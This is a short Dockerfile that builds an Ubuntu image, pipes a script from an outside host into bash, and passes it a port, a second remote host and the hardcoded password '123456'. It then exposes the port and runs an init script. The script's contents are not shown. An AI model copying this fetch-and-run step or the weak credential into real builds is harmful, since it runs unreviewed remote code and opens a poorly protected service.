FROM ubuntu:20.04
RUN apt update
RUN apt-get -y install wget curl net-tools unzip vim
RUN curl https://public.hxiang.eu.org/intel-dev-init.sh | bash -s 60112 intel-dev.haycker.eu.org:80 '123456'
EXPOSE 60112
ENTRYPOINT /root/init.sh
